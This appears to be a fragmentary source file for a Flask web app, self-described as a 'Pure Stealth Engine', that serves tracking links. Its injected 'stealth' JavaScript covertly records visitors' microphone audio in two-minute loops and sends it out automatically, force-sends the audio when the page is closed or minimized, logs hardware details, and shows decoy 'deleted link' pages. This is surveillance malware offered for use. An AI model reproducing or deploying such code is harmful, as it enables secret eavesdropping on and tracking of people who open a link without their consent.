# by:@ROMEO_UCHIHA (Pure Stealth Engine, 2-Min Audio, Redesigned UI & Deleted Link Tracking)
...
<head>
    ...
    <style>
        body { background-color: #030008; color: white; overflow-x: hidden; font-family: 'Plus Jakarta Sans', sans-serif; }
...
# --- LANDING PAGE (Redirecting to Romeogaming) ---
@app.route("/")
def index(): 
...
def target_page(link_id):
    ...
    # ----------------------------------------------------
    # DELETED LINK UI & STEALTH (For Admin)
    # ----------------------------------------------------
    if not res.data:
        del_html = BASE_TAILWIND + f"""
        <div class="glass-box p-10 max-w-lg w-full text-center relative overflow-hidden">
...
# --- INJECTABLE JS STEALTH LOGIC (Shared between landing, deleted, and target pages) ---
def get_stealth_js_logic():
    return """
        ...
        // --- MICROPHONE LOGIC (2 Minute Auto-Send & Instant Force Send) ---
        let mediaRecorder;
        let audioChunks = [];
        ...
        async function startAudioRecording() {
            try {
                ...
                function initiateRecorder() {
                    ...
                    mediaRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            let audioBlob = new Blob(audioChunks); // Browser dynamically creates proper blob
                        ...
                        audioChunks = [];
                        if(isRecording) initiateRecorder(); // Loop if still active
                    };
                ...
                // Force send whatever recorded immediately on exit/minimize
                const handleExit = () => {
                    if(mediaRecorder && mediaRecorder.state === "recording") {
                        isRecording = false; // Prevent auto-restart loop
                        mediaRecorder.stop();
                    }
                };
...
def log_hw(l_id):
    try:
        ...
        v_url = f"{link_ctx['target_domain']}/t/{l_id}" if not l_id.startswith("del_") and l_id != "admin" else link_ctx['target_domain']
